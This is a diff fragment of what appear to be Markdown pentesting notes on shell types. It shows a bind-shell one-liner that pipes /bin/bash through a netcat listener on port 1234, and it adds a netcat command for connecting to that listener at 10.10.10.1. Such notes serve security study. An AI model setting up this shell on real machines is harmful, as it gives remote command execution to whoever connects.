@@ -90,8 +90,9 @@ Type of Shell | Method of Communication
 	 ```bash
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 	```
+- use **netcat** to connect ` nc 10.10.10.1 1234 `
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjEyNzkxNzU5NCwtMTE3OTc1MTIxNSwtMT
+eyJoaXN0b3J5IjpbLTc3Njc3MjQ5MywtMTE3OTc1MTIxNSwtMT
 k2NDk0Mzg4OCwxNDYyMTUxOTMsNjgxMzMxNzQ5LDkyMjI0NTUw
 NywxNDE2NTk5MDcyLC01NzI4NDgwNDEsMTUzNTIzNDk2MSw0MD
 g0Mjg5ODUsLTE0NzQyMDM2MjksLTEwMDEzNzAwNDIsLTE1OTM5
